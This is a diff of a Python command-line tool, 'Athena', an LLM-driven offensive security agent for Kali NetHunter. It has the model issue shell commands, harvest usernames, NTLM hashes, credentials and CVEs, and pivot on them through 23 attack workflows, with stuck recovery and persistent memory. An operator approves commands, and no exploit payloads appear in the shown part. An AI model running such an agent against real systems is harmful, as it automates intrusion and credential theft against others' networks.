-        print(f"\n\033[90m   ATHENA THINKING:\n   {thought}\033[0m")
-
+        print(f"\n\033[90m   THINKING:\n   {thought}\033[0m")
+        
         cmd_match = re.search(
             r'\[CMD\](.*?)\[/?CMD\]',
             response, re.DOTALL | re.IGNORECASE
         )
         if not cmd_match:
-            print(
-                "\n\033[33m   No [CMD] block found. "
-                "Try rephrasing your objective.\033[0m"
-            )
+            print("\n\033[33m   No [CMD] found. Try rephrasing.\033[0m")
             return thought, None
-
+        
         return thought, cmd_match.group(1).strip()
 
-    def _agent_loop(self, initial_prompt: str):
-        prompt = initial_prompt
+    # ── Agent Loop (with stuck recovery FIXED) ────────────────
 
+    def _agent_loop(self, initial_prompt: str, workflow_key: str = None):
+        prompt = initial_prompt
+        self.current_workflow_key = workflow_key
+        self.stuck_counter = 0  # Reset at start of new loop
+        
         while True:
-            thought, cmd = self.think(prompt)
+            thought, cmd = self.think(prompt, workflow_key=workflow_key)
             if cmd is None:
                 break
-
+            
             if self._is_banned(cmd):
-                print("\n\033[31m   ATHENA: Banned command blocked.\033[0m")
-                self._log("[BLOCKED]")
+                print("\n\033[31m   Banned upgrade command blocked.\033[0m")
                 prompt = (
-                    "That apt upgrade variant is hard-blocked. "
+                    "That apt upgrade variant is blocked. "
                     "Use which or dpkg -l to check tools. "
-                    "Provide safe alternative with [THOUGHT] and [CMD]."
+                    "Alternative with [THOUGHT] and [CMD]."
                 )
                 continue
-
+            
             if WORKFLOW_DONE in cmd.upper():
-                print("\n\033[32m   ATHENA: Workflow complete.\033[0m\n")
-                self._log("[WORKFLOW COMPLETE]")
+                print("\n\033[32m   Workflow complete.\033[0m\n")
+                self._log("[DONE]")
                 break
-
+            
+            cmd_normalized = re.sub(r'\s+', ' ', cmd.strip().lower())
+            if cmd_normalized in self.command_history[-3:]:
+                print(f"\n\033[33m   ⚠️  Repeated command detected — telling AI to pivot\033[0m")
+                self.stuck_counter += 1
+                if self.stuck_counter >= 3:
+                    self.stuck_counter = 0
+                    self._handle_stuck()
+                    break
+                prompt = (
+                    f"You already ran '{cmd}' recently. "
+                    "DO NOT repeat it. Take a different approach to advance the mission. "
+                    "[THOUGHT] and [CMD]."
+                )
+                continue
+            
+            self.command_history.append(cmd_normalized)
+            if len(self.command_history) > 20:
+                self.command_history = self.command_history[-20:]
+            
             output = self.run_command(cmd)
-
+            
             if output == "SESSION_EXIT":
                 print("\n\033[35m   ATHENA:\033[0m Session ended by The Priest.")
                 self._generate_report()
                 if self.logfile:
                     self.logfile.close()
                 sys.exit(0)
-
+            
+            if output == "INTERACTIVE_BLOCKED":
+                is_interactive, fix = self._is_interactive(cmd)
+                prompt = (
+                    f"That command would hijack the terminal. {fix} "
+                    f"Provide non-interactive alternative with [THOUGHT] and [CMD]."
+                )
+                continue
+            
             if output == "COMMAND_REJECTED":
+                self.stuck_counter += 1  # FIXED: Increment on reject
+                if self.stuck_counter >= 3:
+                    self.stuck_counter = 0
+                    self._handle_stuck()
+                    break
+                
                 try:
-                    alt = input(
-                        "\n\033[35m   ATHENA:\033[0m Suggest alternative? [y/n]: "
-                    ).strip().lower()
+                    raw = input(
+                        "\n\033[35m   ATHENA:\033[0m Alternative approach? [y/n]: "
+                    )
                 except (EOFError, KeyboardInterrupt):
                     break
-                if alt == "y":
+                if self._normalize_choice(raw) == "y":
                     prompt = (
-                        "The Priest rejected that command. "
-                        "Suggest a meaningfully different approach. "
-                        "[THOUGHT] and [CMD]."
+                        "The Priest rejected that. "
+                        "Different approach to same goal. [THOUGHT] and [CMD]."
                     )
                     continue
                 else:
                     break
-
-            pivot_block = ""
+            
+            # Success — reset stuck counter
+            self.stuck_counter = 0
+            
+            pivot = ""
             pivotable = {
                 k: v for k, v in self.findings.items()
-                if v and k in (
-                    "username", "hash_ntlm", "hash_generic",
-                    "credential", "cve", "open_port", "ip_address", "domain"
-                )
+                if v and k in ("user","hash_ntlm","hash","cred","cve","port","ip","exposed_path")
             }
             if pivotable:
-                pivot_block = "\n\nACTIONABLE FINDINGS TO PIVOT ON NOW:\n"
+                pivot = "\nACTIONABLE FINDINGS:\n"
                 for k, v in pivotable.items():
-                    unique = list(dict.fromkeys(v))[-5:]
-                    pivot_block += f"  {k.upper()}: {', '.join(str(x) for x in unique)}\n"
-
+                    unique = list(dict.fromkeys(v))[-4:]
+                    pivot += f"  {k.upper()}: {', '.join(str(x) for x in unique)}\n"
+            
             prompt = (
-                f"TERMINAL OUTPUT:\n{output}"
-                f"{pivot_block}\n\n"
-                "Analyze with elite [THOUGHT]. Reference findings and pivot. "
-                "If mission complete put WORKFLOW_COMPLETE in [CMD]. "
-                "Otherwise issue next [CMD]."
+                f"TERMINAL OUTPUT:\n{output}{pivot}\n\n"
+                "Analyze with elite reasoning in [THOUGHT]. "
+                "Pivot on findings. "
+                "WORKFLOW_COMPLETE if done, else next [CMD]."
             )
 
-    def _resolve_target_for_workflow(self) -> str:
-        target = (
-            self.target_info.get("ip")
-            or self.target_info.get("domain")
-            or ""
-        )
+    # ── Workflows ─────────────────────────────────────────────
+
+    def _resolve_target(self) -> str:
+        target = self.target_info.get("ip") or self.target_info.get("domain") or ""
         if not target:
             try:
-                target = input(
-                    "\033[90m   Enter target IP / domain: \033[0m"
-                ).strip()
+                target = input("\033[90m   Enter target: \033[0m").strip()
             except (EOFError, KeyboardInterrupt):
                 target = ""
         return target
 
     def run_workflow(self, key: str):
         wf = WORKFLOWS[key]
-        print(
-            f"\n\033[35m   ATHENA:\033[0m "
-            f"Initiating \033[97m{wf['name']}\033[0m...\n"
-        )
+        print(f"\n\033[35m   ATHENA:\033[0m {wf['name']}...\n")
         self._log(f"[WORKFLOW] {wf['name']}")
-        target = self._resolve_target_for_workflow()
+        target = self._resolve_target()
         if not target:
-            print("\033[31m   Cannot run workflow without a target.\033[0m")
+            print("\033[31m   No target.\033[0m")
             return
         prompt = wf["prompt"].format(target=target)
-        self._agent_loop(prompt)
+        self._agent_loop(prompt, workflow_key=key)
 
     def show_workflow_menu(self):
         print("\n\033[35m   ATHENA:\033[0m Workflows:\n")
@@ -1606,14 +1699,70 @@ class AthenaSession:
         if choice in WORKFLOWS:
             self.run_workflow(choice)
         elif choice != "0":
-            print("\033[33m   Invalid selection.\033[0m")
+            print("\033[33m   Invalid.\033[0m")
+
+    # ── Stuck Recovery (FIXED) ────────────────────────────────
+
+    def _handle_stuck(self):
+        """FIXED: Now actually called when stuck_counter hits 3."""
+        print("\n\033[33m   ⚠  Athena is stuck. Asking AI for 3 alternative approaches...\033[0m")
+        
+        findings_summary = []
+        for k, v in self.findings.items():
+            if v:
+                findings_summary.append(f"{k}={list(dict.fromkeys(v))[-3:]}")
+        
+        prompt = (
+            "You have hit a wall. The Priest has rejected/aborted 3 commands. "
+            f"Current findings: {' | '.join(findings_summary) if findings_summary else 'minimal'}. "
+            "Output ONLY this format:\n"
+            "[OPTIONS]\n"
+            "1. <approach 1 — one line>\n"
+            "2. <approach 2 — one line>\n"
+            "3. <approach 3 — one line>\n"
+            "[/OPTIONS]\n"
+            "Each must take a fundamentally different angle (e.g. enum vs exploit vs creds vs pivot)."
+        )
+        
+        response = self._think_with_fallback([
+            {"role": "system", "content": "You are Athena, presenting 3 approaches when stuck."},
+            {"role": "user", "content": prompt}
+        ])
+        
+        if not response:
+            print("\033[31m   AI unavailable. Type your own next objective.\033[0m")
+            return
+        
+        opt_match = re.search(r'\[OPTIONS\](.*?)\[/OPTIONS\]', response, re.DOTALL)
+        options_text = opt_match.group(1).strip() if opt_match else response
+        
+        print(f"\n\033[35m   ATHENA — 3 ALTERNATIVES:\033[0m\n")
+        print(f"\033[97m{options_text}\033[0m\n")
+        
+        try:
+            choice = input("\033[90m   Pick [1/2/3] or type your own objective: \033[0m").strip()
+        except (EOFError, KeyboardInterrupt):
+            return
+        
+        if choice in ("1", "2", "3"):
+            lines = options_text.split('\n')
+            for line in lines:
+                if line.strip().startswith(choice + "."):
+                    new_objective = line.split('.', 1)[1].strip()
+                    print(f"\033[32m   Pursuing: {new_objective}\033[0m")
+                    self._agent_loop(new_objective)
+                    return
+        elif choice:
+            self._agent_loop(choice)
+
+    # ── Findings ──────────────────────────────────────────────
 
     def show_findings(self):
         has_any = any(v for v in self.findings.values())
         if not has_any:
             print("\n\033[90m   No findings yet.\033[0m\n")
             return
-        print("\n\033[35m   ATHENA -- FINDINGS:\033[0m\n")
+        print("\n\033[35m   FINDINGS:\033[0m\n")
         for key, vals in self.findings.items():
             if vals:
                 unique = list(dict.fromkeys(vals))
@@ -1622,71 +1771,186 @@ class AthenaSession:
                     print(f"      \033[90m- {v}\033[0m")
         print()
 
+    # ── Report ────────────────────────────────────────────────
+
     def _generate_report(self):
-        ts       = datetime.datetime.now()
+        ts = datetime.datetime.now()
         duration = ts - self.session_start
-        rpath    = os.path.join(
+        rpath = os.path.join(
             LOG_DIR,
             f"report_{self.session_start.strftime('%Y%m%d_%H%M%S')}.txt"
         )
         try:
             with open(rpath, "w") as f:
-                f.write("=" * 60 + "\n")
-                f.write(f"ATHENA v{VERSION} SESSION REPORT\n")
-                f.write("=" * 60 + "\n")
-                f.write(f"Started  : {self.session_start.isoformat()}\n")
-                f.write(f"Ended    : {ts.isoformat()}\n")
-                f.write(f"Duration : {str(duration).split('.')[0]}\n")
+                f.write(f"ATHENA v{VERSION} REPORT\n{'='*60}\n")
+                f.write(f"Duration: {str(duration).split('.')[0]}\n")
                 t_str = " | ".join(filter(None, [
-                    self.target_info.get("ip",     ""),
-                    self.target_info.get("domain", "")
+                    self.target_info.get("ip",""),
+                    self.target_info.get("domain","")
                 ]))
-                f.write(f"Target   : {t_str or 'Not set'}\n")
-                f.write(f"LHOST    : {self.lhost}\n\n")
-                f.write("-" * 60 + "\nFINDINGS\n" + "-" * 60 + "\n")
+                f.write(f"Target: {t_str or 'Not set'}\n")
+                f.write(f"LHOST: {self.lhost}\n\n")
+                f.write("FINDINGS\n" + "-"*60 + "\n")
                 for key, vals in self.findings.items():
                     if vals:
-                        unique = list(dict.fromkeys(vals))
                         f.write(f"\n{key.upper()}:\n")
-                        for v in unique:
+                        for v in list(dict.fromkeys(vals)):
                             f.write(f"  - {v}\n")
-                f.write("\n" + "=" * 60 + "\nEND OF REPORT\n")
+                f.write(f"\n{'='*60}\nEND\n")
             print(f"\n\033[32m   Report: {rpath}\033[0m")
         except Exception as e:
             print(f"\033[33m   Report failed: {e}\033[0m")
 
     def save_session(self):
-        ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         path = os.path.join(LOG_DIR, f"save_{ts}.txt")
         try:
             with open(path, "w") as f:
-                f.write(f"ATHENA SAVE -- {ts}\n{'='*60}\n\n")
+                f.write(f"ATHENA SAVE {ts}\n{'='*60}\n\n")
                 for msg in self.history:
                     f.write(f"[{msg['role'].upper()}]\n{msg['content']}\n\n")
             print(f"\033[32m   Saved: {path}\033[0m")
         except Exception as e:
             print(f"\033[31m   Save failed: {e}\033[0m")
 
+    # ── Help & Status ─────────────────────────────────────────
+
+    def _current_provider_name(self) -> str:
+        if 0 <= self.provider_index < len(PROVIDER_CHAIN):
+            return PROVIDER_CHAIN[self.provider_index][2]
+        return "Unknown"
+
+    def _handle_remember(self, raw_input: str):
+        remember_file = os.path.join(INSTALL_DIR, "remembered.txt")
+        text = raw_input[len("remember"):].strip()
+        
+        if not text:
+            important = []
+            for k in ("ip", "port", "user", "hash_ntlm", "hash", "cred", "cve", "exposed_path"):
+                vals = self.findings.get(k, [])
+                if vals:
+                    unique = list(dict.fromkeys(vals))[-5:]
+                    important.append(f"{k}: {', '.join(str(v) for v in unique)}")
+            if not important:
+                print("\033[33m   Nothing important to remember yet.\033[0m")
+                return
+            text = " | ".join(important)
+        
+        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
+        target = self.target_info.get("ip") or self.target_info.get("domain") or "general"
+        entry = f"[{ts}] [{target}] {text}"
+        
+        try:
+            with open(remember_file, "a") as f:
+                f.write(entry + "\n")
+            self.remembered.append(entry)
+            print(f"\033[32m   Remembered: {text[:80]}{'...' if len(text)>80 else ''}\033[0m")
+        except Exception as e:
+            print(f"\033[31m   Save failed: {e}\033[0m")
+
+    def _handle_recall(self):
+        remember_file = os.path.join(INSTALL_DIR, "remembered.txt")
+        if not os.path.exists(remember_file):
+            print("\033[33m   Nothing remembered yet. Use 'remember' to save facts.\033[0m")
+            return
+        
+        try:
+            with open(remember_file) as f:
+                lines = [l.strip() for l in f if l.strip()]
+        except Exception as e:
+            print(f"\033[31m   Read failed: {e}\033[0m")
+            return
+        
+        if not lines:
+            print("\033[33m   Nothing remembered yet.\033[0m")
+            return
+        
+        target = self.target_info.get("ip") or self.target_info.get("domain")
+        relevant = [l for l in lines if target and target in l] or lines
+        
+        print(f"\n\033[35m   REMEMBERED ({len(relevant)} entries):\033[0m")
+        for entry in relevant[-15:]:
+            print(f"   \033[90m• {entry}\033[0m")
+        
+        if relevant:
+            context = "\n".join(relevant[-10:])
+            self.history.insert(0, {
+                "role": "user",
+                "content": f"PREVIOUSLY REMEMBERED FACTS (use these, do not re-discover):\n{context}"
+            })
+            self.history.insert(1, {
+                "role": "assistant",
+                "content": "[CMD]ACK[/CMD]"
+            })
+            print(f"\033[32m   Loaded into AI context.\033[0m\n")
+
+    def _show_tools_status(self):
+        print("\n\033[35m   TOOL AVAILABILITY:\033[0m\n")
+        for tool in EXPECTED_TOOLS:
+            if tool not in self.tools_available:
+                self.tools_available[tool] = cmd_exists(tool)
+        
+        cols = 3
+        items = list(self.tools_available.items())
+        rows = (len(items) + cols - 1) // cols
+        for r in range(rows):
+            row_items = items[r::rows][:cols]
+            line = "   "
+            for tool, present in row_items:
+                mark = "\033[32m✓\033[0m" if present else "\033[31m✗\033[0m"
+                line += f"{mark} {tool:<18}"
+            print(line)
+        print()
+        
+        missing = [t for t, p in self.tools_available.items() if not p]
+        if missing:
+            try:
+                ans = input(f"\033[33m   Install {len(missing)} missing tools? [y/n]: \033[0m")
+            except (EOFError, KeyboardInterrupt):
+                return
+            if self._normalize_choice(ans) == "y":
+                for t in missing:
+                    install_if_missing(t)
+                    self.tools_available[t] = cmd_exists(t)
+
     def show_help(self):
         print(
-            "\n\033[35m   ATHENA v5.0 -- COMMANDS\033[0m\n"
-            "   \033[97mworkflow\033[0m   23 pre-built attack workflows\n"
-            "   \033[97mtarget\033[0m     Set or update session target\n"
-            "   \033[97mfindings\033[0m   Show all extracted findings\n"
-            "   \033[97msave\033[0m       Save session to file\n"
-            "   \033[97mreport\033[0m     Generate session report now\n"
-            "   \033[97mclear\033[0m      Clear AI memory (findings preserved)\n"
-            "   \033[97mhelp\033[0m       Show this menu\n"
-            "   \033[97mexit / q\033[0m   End session and report\n\n"
+            f"\n\033[35m   ATHENA v{VERSION}\033[0m\n"
+            f"   Model  : \033[97m{self._current_provider_name()}\033[0m\n"
+            f"   LHOST  : \033[97m{self.lhost}\033[0m\n\n"
+            "   \033[97mworkflow\033[0m  23 attack workflows\n"
+            "   \033[97mtarget\033[0m    Set or update target\n"
+            "   \033[97mfindings\033[0m  Show extracted findings\n"
+            "   \033[97mremember\033[0m  Save important findings (persistent)\n"
+            "   \033[97mrecall\033[0m    Load remembered facts into AI\n"
+            "   \033[97mtools\033[0m     Show tool availability + auto-install missing\n"
+            "   \033[97msave\033[0m      Save conversation to file\n"
+            "   \033[97mreport\033[0m    Generate report now\n"
+            "   \033[97mmodel\033[0m     Show current provider and full chain\n"
+            "   \033[97mclear\033[0m     Reset AI memory (findings kept)\n"
+            "   \033[97mhelp\033[0m      This menu\n"
+            "   \033[97mexit/q\033[0m    End session + report\n\n"
             "   \033[90mOr type any objective in plain English.\033[0m\n"
-            f"   \033[90mLHOST: {self.lhost}\033[0m\n"
         )
+
+    def show_model_status(self):
+        print("\n\033[35m   PROVIDER CHAIN:\033[0m\n")
+        for i, (provider, model, name) in enumerate(PROVIDER_CHAIN):
+            active = " ◀ ACTIVE" if i == self.provider_index else ""
+            avail = "✅" if (
+                (provider == "cerebras" and self.cerebras_client and not self.cerebras_disabled) or
+                (provider == "groq" and self.groq_client)
+            ) else "❌"
+            print(f"   {avail} [{i+1}] {name}{active}")
+        print()
+
+    # ── REPL ──────────────────────────────────────────────────
 
     def repl(self):
         print(BANNER)
         self.set_target()
         self.show_help()
-
+        
         while True:
             try:
                 user_input = input("\033[35m[PRIEST]\033[0m > ").strip()
@@ -1696,13 +1960,13 @@ class AthenaSession:
                 if self.logfile:
                     self.logfile.close()
                 break
-
+            
             if not user_input:
                 continue
-
+            
             self._log(f"[PRIEST] {user_input}")
             cmd = user_input.lower()
-
+            
             if cmd in ("exit", "quit", "q"):
                 print("\n\033[35m   ATHENA:\033[0m Generating report...\n")
                 self._generate_report()
@@ -1721,11 +1985,37 @@ class AthenaSession:
                 self.save_session()
             elif cmd == "report":
                 self._generate_report()
+            elif cmd == "model":
+                self.show_model_status()
             elif cmd == "clear":
                 self.history.clear()
+                self.current_workflow_key = None
                 print("\033[90m   Memory cleared. Findings preserved.\033[0m")
+            elif cmd == "remember" or cmd.startswith("remember "):
+                self._handle_remember(user_input)
+            elif cmd == "recall":
+                self._handle_recall()
+            elif cmd == "tools":
+                self._show_tools_status()
             else:
-                self._agent_loop(user_input)
+                self._agent_loop(user_input, workflow_key=None)
+
+
+# ─────────────────────────────────────────────────────────────
+# BANNER
+# ─────────────────────────────────────────────────────────────
+
+BANNER = """\033[35m
+ █████╗ ████████╗██╗  ██╗███████╗███╗   ██╗ █████╗
+██╔══██╗╚══██╔══╝██║  ██║██╔════╝████╗  ██║██╔══██╗
+███████║   ██║   ███████║█████╗  ██╔██╗ ██║███████║
+██╔══██║   ██║   ██╔══██║██╔══╝  ██║╚██╗██║██╔══██║
+██║  ██║   ██║   ██║  ██║███████╗██║ ╚████║██║  ██║
+╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
+\033[0m\033[90m        AI Offensive Security Agent v6.1
+           Commander: The Priest | Kali NetHunter
+     Auto-Exploit | Persistent State | Stuck Recovery\033[0m
+"""
 
 
 if __name__ == "__main__":
